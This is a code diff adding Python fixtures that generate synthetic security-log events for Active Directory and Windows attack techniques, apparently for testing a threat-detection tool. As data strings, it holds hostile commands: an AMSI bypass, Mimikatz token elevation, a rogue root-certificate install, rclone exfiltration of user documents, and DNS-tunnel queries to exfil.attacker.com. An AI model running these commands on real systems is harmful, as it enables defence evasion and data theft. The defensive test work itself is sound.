@@ -481,6 +481,255 @@ def log_clear() -> list[dict]:
     ]
 
 
+def kerberoast(user: str = "mallory", service: str = "MSSQLSvc/db01.corp.local:1433",
+               encryption: str = "0x17") -> list[dict]:
+    return [{
+        "source": "eventlog", "channel": "Security", "event_id": 4769,
+        "timestamp": _ts(-1).isoformat(), "user": user,
+        "message": (
+            "A Kerberos service ticket was requested. Account Name: "
+            f"{user}. Service Name: {service}. Service ID: S-1-5-21-1-2-3. "
+            f"Ticket Encryption Type: {encryption}."
+        ),
+        "raw": {"ticket_encryption_type": encryption, "service_name": service},
+    }]
+
+
+def asrep_roast(user: str = "mallory", options: str = "0x40810000",
+                target: str = "no_preauth_user") -> list[dict]:
+    return [{
+        "source": "eventlog", "channel": "Security", "event_id": 4768,
+        "timestamp": _ts(-1).isoformat(), "user": user,
+        "message": (
+            "A Kerberos authentication ticket (TGT) was requested. "
+            f"Account Name: {user}. User ID: CORP\\{target}. "
+            f"Ticket Options: {options}."
+        ),
+        "raw": {"ticket_options": options, "target_account_name": target},
+    }]
+
+
+def dcsync(user: str = "mallory", mask: str = "0x100") -> list[dict]:
+    return [{
+        "source": "eventlog", "channel": "Security", "event_id": 4662,
+        "timestamp": _ts(-1).isoformat(), "user": user,
+        "message": (
+            "An operation was performed on an object. "
+            f"Account Name: {user}. Directory Service: DC01.corp.local. "
+            f"Object: CN=mallory,CN=Users,DC=corp,DC=local. "
+            f"Access Mask: {mask}."
+        ),
+        "raw": {"access_mask": mask, "directory_service": "DC01.corp.local"},
+    }]
+
+
+def golden_ticket(user: str = "mallory", target: str = "krbtgt") -> list[dict]:
+    return [{
+        "source": "eventlog", "channel": "Security", "event_id": 4768,
+        "timestamp": _ts(-1).isoformat(), "user": user,
+        "message": (
+            "A Kerberos authentication ticket (TGT) was requested. "
+            f"Account Name: {user}. Target Account Name: {target}. "
+            "Ticket Options: 0x40810010."
+        ),
+        "raw": {"target_account_name": target, "ticket_options": "0x40810010"},
+    }]
+
+
+def silver_ticket(user: str = "administrator", service: str = "cifs/dc01.corp.local") -> list[dict]:
+    return [{
+        "source": "eventlog", "channel": "Security", "event_id": 4769,
+        "timestamp": _ts(-1).isoformat(), "user": user,
+        "message": (
+            "A Kerberos service ticket was requested. "
+            f"Account Name: {user}. Service Name: {service}. "
+            "Ticket Encryption Type: 0x17."
+        ),
+        "raw": {"ticket_encryption_type": "0x17", "service_name": service},
+    }]
+
+
+def pass_the_hash(user: str = "administrator", source_ip: str = "192.168.99.77",
+                  logon_type: int = 3, package: str = "NTLM") -> list[dict]:
+    return [{
+        "source": "eventlog", "channel": "Security", "event_id": 4624,
+        "timestamp": _ts(-1).isoformat(), "user": user,
+        "message": (
+            "An account was successfully logged on. "
+            f"Account Name: {user}. Logon Type: {logon_type}. "
+            f"Source Network Address: {source_ip}. "
+            f"Logon Process: NtLmSsp. Authentication Package: {package}."
+        ),
+        "raw": {
+            "logon_type": logon_type, "source_ip": source_ip,
+            "logon_process": "NtLmSsp", "authentication_package": package,
+        },
+    }]
+
+
+def pass_the_ticket(user: str = "mallory", logon_type: int = 9,
+                    source_ip: str = "10.0.0.44") -> list[dict]:
+    return [{
+        "source": "eventlog", "channel": "Security", "event_id": 4624,
+        "timestamp": _ts(-1).isoformat(), "user": user,
+        "message": (
+            "An account was successfully logged on. "
+            f"Account Name: {user}. Logon Type: {logon_type}. "
+            f"Source Network Address: {source_ip}. "
+            "Authentication Package: Kerberos."
+        ),
+        "raw": {
+            "logon_type": logon_type, "source_ip": source_ip,
+            "authentication_package": "Kerberos",
+        },
+    }]
+
+
+def bloodhound_recon() -> list[dict]:
+    return [_process(
+        "SharpHound.exe",
+        r"C:\Tools\SharpHound.exe --CollectionMethod All --ZipFilename loot.zip",
+        path=r"C:\Tools\SharpHound.exe",
+    )]
+
+
+def gpo_abuse() -> list[dict]:
+    return [{
+        "source": "eventlog", "channel": "Security", "event_id": 5136,
+        "timestamp": _ts(-1).isoformat(), "user": "mallory",
+        "message": (
+            "A directory service object was modified. Account Name: mallory. "
+            "Object: CN={A1B2C3D4-E5F6-7890-ABCD-EF1234567890},CN=Policies,"
+            "CN=System,DC=corp,DC=local."
+        ),
+        "raw": {
+            "object_dn": "CN={A1B2C3D4-E5F6-7890-ABCD-EF1234567890},CN=Policies,"
+                         "CN=System,DC=corp,DC=local",
+        },
+    }]
+
+
+def dll_sideload(module: str = r"C:\Users\alice\AppData\Local\Temp\evil.dll",
+                 source: str = r"C:\Windows\System32\svchost.exe") -> list[dict]:
+    return [{
+        "source": "eventlog", "channel": "Sysmon", "event_id": 7,
+        "timestamp": _ts(-1).isoformat(), "user": "alice",
+        "message": (
+            f"Image: {source} "
+            f"ImageLoaded: {module}"
+        ),
+        "raw": {"source_image": source, "image_loaded": module},
+    }]
+
+
+def process_inject(source: str = r"C:\Windows\explorer.exe",
+                   target: str = r"C:\Windows\System32\lsass.exe") -> list[dict]:
+    return [{
+        "source": "eventlog", "channel": "Sysmon", "event_id": 8,
+        "timestamp": _ts(-1).isoformat(), "user": "alice",
+        "message": (
+            f"Source Image: {source} Target Image: {target} NewThreadId: 1234"
+        ),
+        "raw": {"source_image": source, "target_image": target},
+    }]
+
+
+def token_manip() -> list[dict]:
+    script = "Invoke-Mimikatz -Command '\"token::elevate\"'"
+    return [{
+        "source": "powershell",
+        "channel": "Microsoft-Windows-PowerShell/Operational",
+        "event_id": 4104,
+        "timestamp": _ts(-1).isoformat(), "user": "alice",
+        "message": f"Creating Scriptblock text (1 of 1): {script}",
+        "raw": {"script_block": script, "command_line": script},
+    }]
+
+
+def printnightmare() -> list[dict]:
+    return [_process(
+        "rundll32.exe",
+        "rundll32.exe printui.dll,PrintUIEntry /ia /m \"C:\\Temp\\evil.dll\"",
+        path=r"C:\Windows\System32\rundll32.exe",
+    )]
+
+
+def safeboot_tamper() -> list[dict]:
+    return [_process(
+        "bcdedit.exe",
+        "bcdedit /set {current} safeboot minimal",
+        path=r"C:\Windows\System32\bcdedit.exe",
+    )]
+
+
+def amsi_bypass() -> list[dict]:
+    script = (
+        "$x=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
+        "$x.GetField('amsiInitFailed').SetValue($null,$true)"
+    )
+    return [{
+        "source": "powershell",
+        "channel": "Microsoft-Windows-PowerShell/Operational",
+        "event_id": 4104,
+        "timestamp": _ts(-1).isoformat(), "user": "alice",
+        "message": f"Creating Scriptblock text (1 of 1): {script}",
+        "raw": {"script_block": script, "command_line": script},
+    }]
+
+
+def cert_spoof() -> list[dict]:
+    return [_process(
+        "certutil.exe",
+        "certutil -addstore root C:\\Temp\\rogue.cer",
+        path=r"C:\Windows\System32\certutil.exe",
+    )]
+
+
+def cloud_sync_exfil() -> list[dict]:
+    return [_process(
+        "rclone.exe",
+        r"rclone copy C:\Users\alice\Documents gdrive:exfil --log-file C:\Temp\rclone.log",
+        path=r"C:\Tools\rclone.exe",
+    )]
+
+
+def webhook_c2() -> list[dict]:
+    return [
+        _process(
+            "powershell.exe",
+            "powershell.exe -Command "
+            "Invoke-RestMethod -Uri https://hooks.slack.com/services/T0000000/B0000000/xxxx",
+            path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+        ),
+        {
+            "source": "dns", "process": "powershell.exe", "pid": 1000,
+            "query": "hooks.slack.com", "response": "10.0.0.9",
+            "response_size": 76,
+            "timestamp": _ts(-0.5).isoformat(),
+        },
+    ]
+
+
+def dns_tunnel(count: int = 20, pid: int = 1234,
+               base: str = "exfil.attacker.com") -> list[dict]:
+    out = []
+    for i in range(count):
+        label = "aB3dE9fGh1iJkLmN0pQrStUvWxYzAbCd" + f"{i:02d}"
+        out.append({
+            "source": "dns", "process": "dnsx.exe", "pid": pid,
+            "query": f"{label}.{base}", "response": "10.66.66.1",
+            "response_size": 76,
+            "timestamp": _ts_seconds(-i * 2).isoformat(),
+        })
+    out.append({
+        "source": "dns", "process": "dnsx.exe", "pid": pid,
+        "query": f"bigchunk.{base}", "response": "TXT" * 40,
+        "response_size": 520,
+        "timestamp": _ts_seconds(-1).isoformat(),
+    })
+    return out
+
+
 def ml_credential_spray(attempts: int = 24) -> list[dict]:
     """Password spray from many external IPs at night with account lockouts.
 
